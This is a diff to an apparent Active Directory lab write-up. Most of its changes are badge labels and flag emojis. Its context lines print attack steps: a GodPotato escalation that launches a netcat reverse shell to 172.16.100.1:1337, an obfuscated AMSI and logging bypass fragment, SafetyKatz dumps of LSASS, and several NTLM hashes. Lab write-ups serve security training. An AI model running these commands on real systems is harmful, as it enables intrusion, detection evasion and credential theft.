@@ -566,7 +566,6 @@ BUILTIN\Administrators👥                   Alias            S-1-5-32-544 Manda
 
 [SNIP]
 ```
-🚩
 
 ---
 
@@ -977,7 +976,6 @@ SID               : S-1-5-18
 
 [SNIP]
 ```
-🚩
 
 ---
 
@@ -1053,19 +1051,6 @@ Microsoft Windows [Version 10.0.17763.2452]
 C:\Users\Administrator.TECH>
 ```
 🚀
-
-![mgmtsrv | administrator #>](https://custom-icon-badges.demolab.com/badge/mgmtsrv-administrator%20[%23>]-64b5f6?logo=windows11&logoColor=white)
-
-`set username`:
-```
-USERNAME=Administrator👤
-```
-
-`set computername`:
-```
-COMPUTERNAME=MGMTSRV🖥️
-```
-🚩
 
 ---
 
@@ -1255,7 +1240,6 @@ SID               : S-1-5-18
            rc4_hmac_nt_exp   54c0572a3ddc383be81cdd37b3c8d8a6
            rc4_hmac_old_exp  54c0572a3ddc383be81cdd37b3c8d8a6
 ```
-🚩
 
 ---
 
@@ -1455,7 +1439,7 @@ PS C:\Windows\system32>
 ```
 🚀
 
-![sqlserversync | dbserver31 $>](https://custom-icon-badges.demolab.com/badge/sqlserversync-dbserver31%20[%24>]-64b5f6?logo=windows11&logoColor=white)
+![dbserver31 | sqlserversync $>](https://custom-icon-badges.demolab.com/badge/dbserver31-sqlserversync%20[%24>]-64b5f6?logo=windows11&logoColor=white)
 
 `$env:username`:
 ```
@@ -1491,7 +1475,7 @@ SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 
 Description: Attempted to extract credentials from `dbserver31.tech.finance.corp` using `SafetyKatz`, but the operation failed due to insufficient privileges. Since the session was not running in high integrity, access to the LSASS process was restricted. This failure highlights the necessity of obtaining elevated privileges before attempting credential extraction.
 
-![sqlserversync | dbserver31 $>](https://custom-icon-badges.demolab.com/badge/sqlserversync-dbserver31%20[%24>]-64b5f6?logo=windows11&logoColor=white)
+![dbserver31 | sqlserversync $>](https://custom-icon-badges.demolab.com/badge/dbserver31-sqlserversync%20[%24>]-64b5f6?logo=windows11&logoColor=white)
 
 ![HFS - Loader.exe, SafetyKatz.exe](learning_objective_07_hfs_loader_safetykatz.png)
 
@@ -1524,7 +1508,7 @@ Description: Attempted to extract credentials from `dbserver31.tech.finance.corp
 
 Description: Used `GodPotato`, an exploit leveraging Named Pipe token impersonation, to escalate privileges to `SYSTEM` on `dbserver31.tech.finance.corp`. A reverse shell was established to maintain access and facilitate further post-exploitation activities.
 
-![sqlserversync | dbserver31 $>](https://custom-icon-badges.demolab.com/badge/sqlserversync-dbserver31%20[%24>]-64b5f6?logo=windows11&logoColor=white)
+![dbserver31 | sqlserversync $>](https://custom-icon-badges.demolab.com/badge/dbserver31-sqlserversync%20[%24>]-64b5f6?logo=windows11&logoColor=white)
 
 `Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full\' | Get-ItemPropertyValue -Name Version`:
 ```
@@ -1544,7 +1528,7 @@ listening on [any] 1337 ...
 [...]
 ```
 
-![sqlserversync | dbserver31 $>](https://custom-icon-badges.demolab.com/badge/sqlserversync-dbserver31%20[%24>]-64b5f6?logo=windows11&logoColor=white)
+![dbserver31 | sqlserversync $>](https://custom-icon-badges.demolab.com/badge/dbserver31-sqlserversync%20[%24>]-64b5f6?logo=windows11&logoColor=white)
 
 `C:\Users\Public\GodPotato-NET4.exe -cmd "C:\Users\Public\nc64.exe -e C:\Windows\System32\cmd.exe 172.16.100.1 1337"`
 
@@ -1560,8 +1544,9 @@ Microsoft Windows [Version 10.0.17763.2452]
 
 C:\Windows\system32>
 ```
+🚀
 
-![system | dbserver31 #>](https://custom-icon-badges.demolab.com/badge/sqlserversync-dbserver31%20[%23>]-64b5f6?logo=windows11&logoColor=white)
+![dbserver31 | system $>](https://custom-icon-badges.demolab.com/badge/sqlserversync-system%20[%24>]-64b5f6?logo=windows11&logoColor=white)
 
 `$env:username`:
 ```
@@ -1572,7 +1557,6 @@ SYSTEM👤
 ```
 DBSERVER31🖥️
 ```
-🚩
 
 ---
 
@@ -1584,7 +1568,7 @@ Description: Executed PowerShell logging and AMSI bypass techniques to evade det
 
 - **Bypassing PowerShell Logging and AMSI for Evasion**
 
-![system | dbserver31 #>](https://custom-icon-badges.demolab.com/badge/sqlserversync-dbserver31%20[%23>]-64b5f6?logo=windows11&logoColor=white)
+![dbserver31 | system $>](https://custom-icon-badges.demolab.com/badge/sqlserversync-system%20[%24>]-64b5f6?logo=windows11&logoColor=white)
 
 `powershell`
 
@@ -1603,7 +1587,7 @@ S`eT-It`em ( 'V'+'aR' + 'IA' + (("{1}{0}"-f'1','blE:')+'q2') + ('uZ'+'x') ) ( [T
 
 - **Extract Credentials of `tech\sqlserversync` and `tech\DBSERVER31$` from LSASS Memory on `dbserver31.tech.finance.corp`**
 
-![system | dbserver31 #>](https://custom-icon-badges.demolab.com/badge/sqlserversync-dbserver31%20[%23>]-64b5f6?logo=windows11&logoColor=white)
+![dbserver31 | system $>](https://custom-icon-badges.demolab.com/badge/sqlserversync-system%20[%24>]-64b5f6?logo=windows11&logoColor=white)
 
 `C:\Users\Public\Loader.exe -path C:\Users\Public\SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"`:
 ```
@@ -1653,7 +1637,6 @@ SID               : S-1-5-18
 
 [SNIP]
 ```
-🚩
 
 ---
 
@@ -1854,7 +1837,6 @@ Supplemental Credentials:
 
 [SNIP]
 ```
-🚩
 
 ---
 
@@ -2075,7 +2057,6 @@ NTLM : 862f4b5c687b92f464576a572b5214e6
 
 [SNIP]
 ```
-🚩
 
 ---
 
@@ -2248,7 +2229,6 @@ NTLM : 862f4b5c687b92f464576a572b5214e6
 
 [SNIP]
 ```
-🚩
 
 ---
 ---
